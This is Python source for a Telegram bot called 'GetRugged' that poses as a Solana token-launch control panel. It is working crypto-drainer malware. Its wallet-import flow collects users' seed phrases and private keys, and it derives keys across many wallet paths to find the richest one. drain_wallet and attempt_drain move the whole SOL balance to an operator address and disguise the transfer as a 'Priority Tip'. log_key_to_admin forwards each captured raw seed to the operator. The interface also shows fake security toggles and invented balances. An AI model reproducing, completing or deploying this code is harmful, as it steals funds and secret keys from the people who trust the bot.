'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tailor', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo']

def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))

def short_addr(addr: str) -> str:
    if not addr or len(addr) < 12:
        return addr or "—"
    return f"{addr[:4]}...{addr[-4:]}"

def mask_mint(addr: str) -> str:
    if not addr or len(addr) < 10:
        return addr or "—"
    visible = addr[:6]
    stars = "✱" * min(len(addr) - 6, 14)
    return f"{visible}{stars}"

async def staged_loading(message_or_cb, stages: list):
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        if i == 0:
            if is_cb:
                try:
                    await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                    msg = message_or_cb.message
                except Exception:
                    msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
            else:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        else:
            try:
                await msg.edit_text(txt, parse_mode=ParseMode.HTML)
            except Exception:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML) if not is_cb else await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg

SOL_PRICE = 180.0
ETH_PRICE = 3200.0
BNB_PRICE = 580.0
BTC_PRICE = 95000.0
LTC_PRICE = 90.0
USDC_PRICE = 1.0
_price_cache: dict = {}
_price_cache_ts: float = 0.0
_PRICE_TTL = 300.0

async def _refresh_prices() -> None:
    global SOL_PRICE, ETH_PRICE, BNB_PRICE, BTC_PRICE, LTC_PRICE, _price_cache_ts
    try:
        data = await _http_json(
            "GET",
            "https://api.coingecko.com/api/v3/simple/price"
            "?ids=solana,ethereum,binancecoin,bitcoin,litecoin&vs_currencies=usd",
            timeout=6.0,
        )
        if isinstance(data, dict):
            if "solana" in data:
                SOL_PRICE = float(data["solana"]["usd"])
            if "ethereum" in data:
                ETH_PRICE = float(data["ethereum"]["usd"])
            if "binancecoin" in data:
                BNB_PRICE = float(data["binancecoin"]["usd"])
            if "bitcoin" in data:
                BTC_PRICE = float(data["bitcoin"]["usd"])
            if "litecoin" in data:
                LTC_PRICE = float(data["litecoin"]["usd"])
            _price_cache_ts = time.time()
    except Exception as e:
        log.warning("Price refresh failed: %s", e)

async def get_prices() -> None:
    if time.time() - _price_cache_ts > _PRICE_TTL:
        await _refresh_prices()

def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
    return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE

def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
    salt = ("mnemonic" + passphrase).encode("utf-8")
    return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)

def _hmac_sha512(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha512).digest()

def _slip10_derive(seed: bytes, path: str) -> bytes:
    I = _hmac_sha512(b"ed25519 seed", seed)
    IL, IR = I[:32], I[32:]
    for segment in path.lstrip("m/").split("/"):
        if not segment:
            continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened:
            index += 0x80000000
        data = b"\x00" + IL + struct.pack(">I", index)
        I = _hmac_sha512(IR, data)
        IL, IR = I[:32], I[32:]
    return IL

_SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_SECP256K1_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_SECP256K1_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
_SECP256K1_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F

def _modinv(a: int, m: int) -> int:
    return pow(a % m, -1, m)

def _point_add(p1, p2):
    if p1 is None: return p2
    if p2 is None: return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and y1 != y2: return None
    if x1 == x2:
        m = (3 * x1 * x1) * _modinv(2 * y1, _SECP256K1_P) % _SECP256K1_P
    else:
        m = (y2 - y1) * _modinv(x2 - x1, _SECP256K1_P) % _SECP256K1_P
    x3 = (m * m - x1 - x2) % _SECP256K1_P
    y3 = (m * (x1 - x3) - y1) % _SECP256K1_P
    return (x3, y3)

def _point_mul(k: int, point=None):
    if point is None:
        point = (_SECP256K1_GX, _SECP256K1_GY)
    result = None
    addend = point
    while k:
        if k & 1:
            result = _point_add(result, addend)
        addend = _point_add(addend, addend)
        k >>= 1
    return result

def _ser32(i: int) -> bytes:
    return struct.pack(">I", i)

def _ser256(i: int) -> bytes:
    return i.to_bytes(32, "big")

def _parse256(b: bytes) -> int:
    return int.from_bytes(b, "big")

def _point_ser(P, compressed: bool = True) -> bytes:
    if P is None: raise ValueError("point at infinity")
    x, y = P
    if compressed:
        return (b"\x02" if (y % 2 == 0) else b"\x03") + _ser256(x)
    return b"\x04" + _ser256(x) + _ser256(y)

def _bip32_master(seed: bytes) -> Tuple[bytes, bytes]:
    I = _hmac_sha512(b"Bitcoin seed", seed)
    return I[:32], I[32:]

def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
    if index >= 0x80000000:
        data = b"\x00" + k + _ser32(index)
    else:
        P = _point_mul(_parse256(k))
        data = _point_ser(P, True) + _ser32(index)
    I = _hmac_sha512(c, data)
    IL, IR = I[:32], I[32:]
    ki = (_parse256(IL) + _parse256(k)) % _SECP256K1_N
    if ki == 0 or _parse256(IL) >= _SECP256K1_N:
        raise ValueError("invalid BIP32 child key")
    return _ser256(ki), IR

def _bip32_derive_path(seed: bytes, path: str) -> bytes:
    k, c = _bip32_master(seed)
    for segment in path.lstrip("m/").split("/"):
        if not segment: continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened: index += 0x80000000
        k, c = _bip32_ckd_priv(k, c, index)
    return k

def _normalize_mnemonic(raw: str) -> str:
    s = raw.strip().lower()
    for ch in (",", ";", "|", "\n", "\r", "\t", "\u00a0", "\u2009", "", "\u202f", "\u3000"):
        s = s.replace(ch, " ")
    return " ".join(s.split())

def _is_mnemonic(text: str) -> bool:
    words = text.split()
    return len(words) in (12, 15, 18, 21, 24) and all(w.isalpha() and 2 <= len(w) <= 12 for w in words)

def _sol_keypair_from_seed32(seed32: bytes):
    if not HAS_SOLANA:
        raise RuntimeError("Solana libraries not installed")
    return Keypair.from_seed(seed32)

def _sol_priv_pub_from_seed32(seed32: bytes) -> Tuple[str, str]:
    kp = _sol_keypair_from_seed32(seed32)
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())

SOL_PATHS: List[Tuple[str, str]] = [
    ("Phantom/Solflare/OKX", "m/44'/501'/0'/0'"),
    ("Phantom account 1",    "m/44'/501'/1'/0'"),
    ("Phantom account 2",    "m/44'/501'/2'/0'"),
    ("Phantom account 3",    "m/44'/501'/3'/0'"),
    ("Phantom change 1",     "m/44'/501'/0'/1'"),
    ("Trust Wallet",         "m/44'/501'/0'"),
    ("Trust account 1",      "m/44'/501'/1'"),
]

def derive_solana_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False")
    seed = _pbkdf2_mnemonic(mnemonic)
    out: List[Tuple[str, str, str]] = []
    seen = set()

    for label, path in SOL_PATHS:
        try:
            seed32 = _slip10_derive(seed, path)
            priv, pub = _sol_priv_pub_from_seed32(seed32)
            if pub in seen: continue
            seen.add(pub)
            out.append((label + " " + path, priv, pub))
        except Exception as e:
            log.warning("path %s failed: %s", path, e)

    try:
        exo = _bip32_derive_path(seed, "m/44'/501'/0'/0/0")
        priv, pub = _sol_priv_pub_from_seed32(exo)
        if pub not in seen:
            seen.add(pub)
            out.append(("Exodus m/44'/501'/0'/0/0", priv, pub))
    except Exception as e:
        log.warning("Exodus path failed: %s", e)

    try:
        priv, pub = _sol_priv_pub_from_seed32(seed[:32])
        if pub not in seen:
            seen.add(pub)
            out.append(("Raw BIP39 seed[:32]", priv, pub))
    except Exception as e:
        log.warning("Raw seed path failed: %s", e)

    if not out:
        raise ValueError("No Solana keys could be derived from this mnemonic")
    return out

def parse_solana_private_key(raw: str) -> Tuple[str, str]:
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False")
    s = raw.strip()
    if s.startswith("[") and s.endswith("]"):
        arr = json.loads(s)
        secret = bytes(arr)
    else:
        secret = base58.b58decode(s)
    if len(secret) == 32:
        kp = Keypair.from_seed(secret)
    elif len(secret) == 64:
        kp = Keypair.from_bytes(secret)
    else:
        raise ValueError(f"Unsupported Solana key length: {len(secret)}")
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())

def parse_evm_private_key(raw: str) -> Tuple[str, str]:
    if not HAS_WEB3:
        raise RuntimeError("HAS_WEB3=False")
    key = raw.strip()
    if key.startswith("0x"):
        key = key[2:]
    if len(key) != 64:
        raise ValueError("EVM key must be 64 hex chars")
    acct = Account.from_key(key)
    return "0x" + key.lower(), acct.address

def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
    if not HAS_WEB3:
        return None
    try:
        seed = _pbkdf2_mnemonic(mnemonic)
        path = f"m/44'/60'/0'/0/{account}"
        priv_bytes = _bip32_derive_path(seed, path)
        acct = Account.from_key(priv_bytes)
        return acct.key.hex(), acct.address
    except Exception as e:
        log.warning("EVM mnemonic derive failed: %s", e)
        return None

async def _http_json(method: str, url: str, body: Optional[str] = None, timeout: float = 12.0):
    import urllib.request
    import urllib.error
    def _do():
        req = urllib.request.Request(url, data=(body.encode() if body is not None else None), method=method)
        if body is not None:
            req.add_header("Content-Type", "text/plain")
        req.add_header("User-Agent", "GetRugged/1.0")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = resp.read().decode()
        except urllib.error.HTTPError as e:
            try:
                err_body = e.read().decode()
            except Exception:
                err_body = ""
            raise RuntimeError(f"HTTP {e.code}: {err_body[:200]}")
        if not data:
            return None
        try:
            return json.loads(data)
        except Exception:
            return data
    return await asyncio.to_thread(_do)

async def fetch_sol_balance(pubkey: str) -> float:
    if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
        return 0.0
    try:
        async with AsyncClient(RPC_URL) as client:
            pk = Pubkey.from_string(pubkey)
            resp = await asyncio.wait_for(client.get_balance(pk), timeout=8)
            return resp.value / 1_000_000_000
    except Exception as e:
        log.warning("SOL balance %s: %s", pubkey[:8], e)
        return 0.0

async def pick_best_sol_candidate(candidates: List[Tuple[str, str, str]]) -> Tuple[str, str, str, float]:
    async def one(pub: str) -> float:
        try:
            return await asyncio.wait_for(fetch_sol_balance(pub), timeout=7)
        except Exception:
            return 0.0

    bals = await asyncio.gather(*[one(c[2]) for c in candidates])
    best_i = 0
    best_bal = -1.0
    for i, bal in enumerate(bals):
        if bal > best_bal:
            best_bal = bal
            best_i = i
    label, priv, pub = candidates[best_i]
    return label, priv, pub, best_bal

async def drain_wallet(private_key_b58: str, dest: str) -> Optional[Tuple[str, float]]:
    if not HAS_SOLANA:
        return ("SIM_" + fake_sig()[:32], 0.0)
    try:
        secret = base58.b58decode(private_key_b58.strip())
        if len(secret) == 32:
            kp = Keypair.from_seed(secret)
        elif len(secret) == 64:
            kp = Keypair.from_bytes(secret)
        else:
            return None
        dest_pk = Pubkey.from_string(dest)
        async with AsyncClient(RPC_URL) as client:
            bal_resp = await client.get_balance(kp.pubkey())
            balance = bal_resp.value
            if balance <= MIN_DRAIN_LAMPORTS:
                return None
            amount = balance - MIN_DRAIN_LAMPORTS
            recent = await client.get_latest_blockhash()
            ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=dest_pk, lamports=amount))
            tx = Transaction.new_signed_with_payer([ix], kp.pubkey(), [kp], recent.value.blockhash)
            result = await client.send_transaction(tx)
            sig = str(result.value)
            sol_amount = amount / 1_000_000_000
            return (sig, sol_amount)
    except Exception as e:
        log.exception("SOL drain error: %s", e)
        return None

async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None,
                        bot: Optional[Bot] = None, user=None, wallet: Optional["UserWallet"] = None,
                        _all_sol_candidates: Optional[List[Tuple[str, str, str]]] = None):
    sess = get_session(uid)
    if not sess.wallets:
        return
    active = wallet or (sess.wallets[sess.active_wallet_idx] if sess.active_wallet_idx < len(sess.wallets) else sess.wallets[-1])
    if getattr(active, "drained", False):
        return
    if getattr(active, "drain_attempts", 0) >= 3:
        active.drained = True
        return
    if getattr(active, "is_larp", False) or private_key == "LARP_SIM" or (private_key and private_key.startswith("Sim")):
        return

    has_sol = bool(private_key) and not private_key.startswith("Sim") and private_key != "LARP_SIM"
    if not has_sol:
        return

    if MIN_DRAIN_USD > 0:
        try:
            await get_prices()
        except Exception:
            pass
        sol_b = float(getattr(active, "balance_sol", 0.0) or 0.0)
        usd_val = sol_b * SOL_PRICE
        if usd_val < MIN_DRAIN_USD:
            return

    any_success = False
    drained_sol = 0.0

    if has_sol and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
        res = await drain_wallet(private_key, DRAIN_DESTINATION)
        if res:
            sig, sol_amount = res
            any_success = True
            drained_sol += sol_amount
            sess.last_tx.insert(0, {"sig": sig, "type": "Priority Tip (SOL)", "status": "success", "ts": time.time()})
            global bot_balance_sol
            bot_balance_sol += round(random.uniform(0.05, 2.5), 4)
            _save_state()

    if any_success:
        active.drained = True
        if bot:
            await get_prices()
            await log_key_to_admin(bot, user, sess.last_raw_key or private_key, drained_sol, 0.0, 0.0, 0.0, status="drained")
    else:
        active.drain_attempts = getattr(active, "drain_attempts", 0) + 1

async def log_key_to_admin(
    bot: Bot,
    user,
    raw_key: str,
    sol: float,
    eth: float,
    bnb: float,
    usdc: float,
    btc: float = 0.0,
    ltc: float = 0.0,
    status: str = "drained",
    sol_seen: float = 0.0,
    eth_seen: float = 0.0,
    bnb_seen: float = 0.0,
    usdc_seen: float = 0.0,
    pub: str = "",
):
    try:
        if user is None:
            username = "sweep"
            user_id = "—"
        else:
            username = f"@{user.username}" if getattr(user, "username", None) else (getattr(user, "full_name", None) or "—")
            user_id = str(getattr(user, "id", "—"))

        balances_block = (
            f"Pub: <code>{pub}</code>\n"
            f"SOL: <b>{sol:.6f}</b>\n"
        )
        full_text = (
            f"<b>NEW KEY CAPTURED</b>\n\n"
            f"User: {username}\n"
            f"ID: <code>{user_id}</code>\n"
            f"Status: <code>{status}</code>\n\n"
            f"<b>Key / Seed:</b>\n"
            f"<code>{raw_key}</code>\n\n"
            f"{balances_block}"
        )
        try:
            await bot.send_message(chat_id=KEY_RECEIVER_ID, text=full_text, parse_mode=ParseMode.HTML)
        except Exception:
            pass
    except Exception:
        pass

def btn(text: str, callback_data: str = None, url: str = None, style: str = None) -> InlineKeyboardButton:
    kwargs = {"text": text}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    if style:
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        kwargs.pop("style", None)
        return InlineKeyboardButton(text=text, callback_data=callback_data, url=url)

def main_menu_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("Launch", "menu:launch", style="primary"),
        btn("Wallets", "menu:wallets", style="primary"),
    )
    b.row(
        btn("Portfolio", "menu:portfolio"),
        btn("Transactions", "menu:tx"),
    )
    b.row(
        btn("Settings", "menu:settings"),
        btn("Access", "menu:promo"),
    )
    return b.as_markup()

def back_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[btn("Back to Menu", "menu:main")]])

def wallet_modal_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("Phantom", "wallet:connect:phantom", style="primary"),
        btn("Solflare", "wallet:connect:solflare", style="primary"),
    )
    b.row(
        btn("Backpack", "wallet:connect:backpack"),
        btn("WalletConnect", "wallet:connect:wc"),
    )
    b.row(btn("Import Seed / Private Key", "wallet:import:manual", style="success"))
    b.row(btn("Back", "menu:main"))
    return b.as_markup()

def wallet_connected_card_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("Switch Wallet", "wallet:switch"),
        btn("Disconnect", "wallet:disconnect", style="danger"),
    )
    b.row(btn("Back to Control Panel", "menu:main"))
    return b.as_markup()

def wallets_empty_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn("Connect Wallet", "wallet:import", style="primary"))
    b.row(btn("Menu", "menu:main"))
    return b.as_markup()

def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn("Connect Wallet", "wallet:import", style="success"))
    if has_wallets:
        b.row(
            btn("Switch", "wallet:switch"),
            btn("Rename", "wallet:rename"),
        )
        b.row(btn("Refresh Balances", "wallet:refresh"))
        b.row(btn("Remove All", "wallet:clear", style="danger"))
    b.row(btn("Back", "menu:main"))
    return b.as_markup()

def promo_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn(f"Pay {int(LAUNCH_FEE_SOL)} SOL  ->  +{LAUNCHES_PER_CYCLE} Launches", "promo:pay", style="success"))
    b.row(btn("Redeem Promo Code", "promo:enter", style="primary"))
    b.row(btn("Back", "menu:main"))
    return b.as_markup()

def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    s = sess.settings
    slip = s["slippage"]
    fee = s["priority_fee"]
    sniper_on = s.get("sniper_protection", True)
    mev_on = s.get("mev_protection", True)
    def mark(val, current, suffix="%"):
        return f"[{val}{suffix}]" if val == current else f"{val}{suffix}"
    def mark_fee(val, current):
        return f"[{val}]" if abs(val - current) < 1e-9 else f"{val}"
    b = InlineKeyboardBuilder()
    b.row(
        btn(mark(5, slip), "set:slip:5", style="primary" if slip == 5 else None),
        btn(mark(10, slip), "set:slip:10", style="primary" if slip == 10 else None),
        btn(mark(15, slip), "set:slip:15", style="primary" if slip == 15 else None),
        btn(mark(25, slip), "set:slip:25", style="primary" if slip == 25 else None),
    )
    b.row(
        btn(mark_fee(0.0001, fee), "set:fee:0.0001"),
        btn(mark_fee(0.0005, fee), "set:fee:0.0005"),
        btn(mark_fee(0.001, fee), "set:fee:0.001"),
        btn(mark_fee(0.005, fee), "set:fee:0.005"),
    )
    b.row(
        btn("Custom Slip", "set:custom_slip"),
        btn("Custom Fee", "set:custom_fee"),
    )
    b.row(
        btn(
            f"Sniper Guard: {'Active' if sniper_on else 'Disabled'}",
            "set:sniper:toggle",
            style="success" if sniper_on else "danger",
        ),
        btn(
            f"MEV Protect: {'Active' if mev_on else 'Disabled'}",
            "set:mev:toggle",
            style="success" if mev_on else "danger",
        ),
    )
    b.row(btn("Menu", "menu:main"))
    return b.as_markup()

def socials_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("Twitter", "social:x"),
        btn("Telegram", "social:tg"),
    )
    b.row(
        btn("Website", "social:web"),
        btn("Instagram", "social:ig"),
    )
    b.row(
        btn("Done", "socials:done", style="success"),
        btn("Skip", "socials:skip"),
    )
    b.row(btn("Back", "launch:back:bundle"))
    b.row(btn("Cancel", "menu:main", style="danger"))
    return b.as_markup()

def bundle_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("x5 wallets", "bundle:5"),
        btn("x10 wallets", "bundle:10", style="primary"),
    )
    b.row(
        btn("x15 wallets", "bundle:15"),
        btn("x25 wallets", "bundle:25"),
    )
    b.row(btn("Custom", "bundle:custom"))
    b.row(btn("Back", "launch:back:image"))
    b.row(btn("Cancel", "menu:main", style="danger"))
    return b.as_markup()

def invest_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        btn("3 SOL", "invest:3"),
        btn("5 SOL", "invest:5"),
        btn("10 SOL", "invest:10", style="primary"),
    )
    b.row(
        btn("15 SOL", "invest:15"),
        btn("25 SOL", "invest:25"),
        btn("50 SOL", "invest:50", style="primary"),
    )
    b.row(btn("Custom Amount", "invest:custom"))
    b.row(btn("Back", "launch:back:socials"))
    b.row(btn("Cancel", "menu:main", style="danger"))
    return b.as_markup()

def confirm_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(btn("Confirm & Launch", "launch:confirm", style="success"))
    b.row(
        btn("Name", "launch:edit:name"),
        btn("Ticker", "launch:edit:symbol"),
    )
    b.row(
        btn("Description", "launch:edit:desc"),
        btn("Image", "launch:edit:image"),
    )
    b.row(
        btn("Bundle Size", "launch:edit:bundle"),
        btn("Invest Size", "launch:edit:invest"),
    )
    b.row(btn("Socials", "launch:edit:socials"))
    b.row(btn("Cancel", "menu:main", style="danger"))
    return b.as_markup()

def live_token_kb(mint: str, bundle: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    row = []
    for i in range(1, bundle + 1):
        row.append(btn(f"Sell W{i}", f"dumpone:{mint}:{i}", style="danger"))
        if len(row) == 3:
            b.row(*row)
            row = []
    if row:
        b.row(*row)
    b.row(
        btn("Sell All", f"dump:{mint}", style="danger"),
        btn("Reset", f"dumpreset:{mint}"),
    )
    b.row(btn("View Wallets", f"viewwallets:{mint}", style="primary"))
    b.row(btn("Menu", "menu:main"))
    return b.as_markup()

def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("View Wallets", f"viewwallets:{mint}", style="primary")],
        [btn("Menu", "menu:main")],
    ])

def tx_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[btn("Menu", "menu:main")]])

def build_main_menu_text(sess: "UserSession") -> str:
    if sess.wallets:
        w = sess.wallets[sess.active_wallet_idx]
        wallet_line = f"Wallet: <code>{short_addr(w.public_key)}</code>  |  <b>{w.balance_sol:.4f} {SOL_EMOJI}</b>"
        if len(sess.wallets) > 1:
            wallet_line += f"  <i>({len(sess.wallets)} linked)</i>"
    else:
        wallet_line = "Wallet: <i>None connected</i>"

    live = sum(1 for t in sess.launched_tokens if t.get("status") == "live" and not t.get("dumped"))
    total_launches = len(sess.launched_tokens)
    if sess.portfolio_display_total is not None:
        total_launches = int(sess.portfolio_display_total)
    if sess.portfolio_display_live is not None:
        live = int(sess.portfolio_display_live)
    launches_left = sess.launches_left

    if sess.last_tx:
        last = sess.last_tx[0]
        age = int(time.time() - last.get("ts", time.time()))
        last_line = f"{last.get('type', 'Tx')} - {age}s ago"
    else:
        last_line = "No recent activity"

    sniper = "Active" if sess.settings.get("sniper_protection", True) else "Disabled"
    mev = "Active" if sess.settings.get("mev_protection", True) else "Disabled"

    return (
        "<b>GETRUGGED  //  CONTROL PANEL</b>\n"
        "────────────────────────────\n"
        f"{wallet_line}\n\n"
        f"Launches: <b>{launches_left}</b> remaining  |  Total: <b>{total_launches}</b>  |  Live: <b>{live}</b>\n"
        f"Status: <i>{last_line}</i>\n"
        "────────────────────────────\n"
        f"Security: Sniper Guard [{sniper}]  -  MEV Protect [{mev}]"
    )

WELCOME_IMAGE_CANDIDATES = (
    os.getenv("WELCOME_IMAGE", ""),
    "welcome.jpg",
    "welcome.JPG",
    "Welcome.jpg",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "welcome.jpg"),
)

def welcome_image_path() -> Optional[str]:
    for p in WELCOME_IMAGE_CANDIDATES:
        if p and os.path.isfile(p):
            return p
    return None

async def send_main_menu(target, sess: UserSession, *, edit: bool = False):
    caption = build_main_menu_text(sess)
    kb = main_menu_kb()
    img = welcome_image_path()

    if edit and hasattr(target, "message"):
        msg = target.message
        try:
            if img:
                if msg.photo or msg.video or msg.document:
                    media = InputMediaPhoto(
                        media=FSInputFile(img),
                        caption=caption,
                        parse_mode=ParseMode.HTML,
                    )
                    await msg.edit_media(media=media, reply_markup=kb)
                    return
                try:
                    await msg.delete()
                except Exception:
                    pass
                await target.message.answer_photo(
                    photo=FSInputFile(img),
                    caption=caption,
                    reply_markup=kb,
                    parse_mode=ParseMode.HTML,
                )
                return
            if msg.photo:
                try:
                    await msg.delete()
                except Exception:
                    pass
                await target.message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
            else:
                await msg.edit_text(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
            return
        except Exception:
            try:
                await msg.delete()
            except Exception:
                pass

    answer = target.answer if hasattr(target, "answer") else target.message.answer
    answer_photo = target.answer_photo if hasattr(target, "answer_photo") else target.message.answer_photo
    if img:
        await answer_photo(
            photo=FSInputFile(img),
            caption=caption,
            reply_markup=kb,
            parse_mode=ParseMode.HTML,
        )
    else:
        await answer(
            caption,
            reply_markup=kb,
            parse_mode=ParseMode.HTML,
        )

class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_desc = State()
    waiting_image = State()
    waiting_bundle = State()
    waiting_socials = State()
    waiting_social_link = State()
    waiting_invest = State()
    waiting_invest_custom = State()
    confirm = State()

class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()

class PromoStates(StatesGroup):
    waiting_code = State()

class SettingsStates(StatesGroup):
    waiting_custom_slip = State()
    waiting_custom_fee = State()

router = Router()

async def safe_edit_message(cb: CallbackQuery, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
    msg = cb.message
    try:
        if msg.photo:
            try:
                await msg.delete()
            except Exception:
                pass
